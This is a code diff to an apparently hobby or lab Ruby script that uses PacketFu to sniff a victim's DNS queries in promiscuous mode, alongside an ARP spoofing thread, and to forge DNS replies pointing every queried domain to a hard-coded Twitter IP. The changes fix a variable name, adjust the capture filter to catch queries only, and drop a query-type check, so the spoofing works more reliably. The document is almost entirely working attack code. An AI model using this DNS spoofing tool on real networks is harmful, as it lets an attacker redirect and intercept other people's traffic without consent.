@@ -114,7 +114,7 @@ def dnsResponse
 	udp_packet.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
 
 	# Parse Domain Name
-	@domainName.split('.').each do |section|
+	@domain.split('.').each do |section|
 		udp_packet.payload += section.length.chr
 		udp_packet.payload += section
 	end
@@ -126,7 +126,7 @@ def dnsResponse
 	udp_packet.payload += "\x00\x04"
 
 	#ip = @srcMAC[:ip_saddr].split('.')
-	twitter_IP = "199.59.149.230" # Twitter IP
+	twitter_IP = "199.59.150.39" # Twitter IP
 	domain_IP = twitter_IP.split('.')
 	payload_domain = [domain_IP[0].to_i, domain_IP[1].to_i, domain_IP[2].to_i, domain_IP[3].to_i].pack('c*')
 
@@ -166,7 +166,7 @@ begin
 	capture = PacketFu::Capture.new(:iface => @interface, 
 					:start => true, 
 					:promisc => true, 
-					:filter => "src #{@victimIP} and udp port 53",
+					:filter => "src #{@victimIP} and udp port 53 and udp[10]&0x80 = 0",
 					:save => true)
 
 	puts "Capturing DNS Queries..."
@@ -174,8 +174,6 @@ begin
 		puts "Captured packet"
 
 		@packet = PacketFu::Packet.parse(packet)
-		dnsQuery = @packet.payload[2].to_s + @packet.payload[3].to_s
-		if dnsQuery == '10'
 			@domain = getDomain(@packet.payload[12..-1])
 			if @domain.nil?
 				puts "No domain name found"
@@ -183,7 +181,6 @@ begin
 			end
 			puts "DNS Query for: " + @domain
 			dnsResponse
-		end
 	end # End do packet
 	arp_spoof_thread.join
 	# Catch interrupt
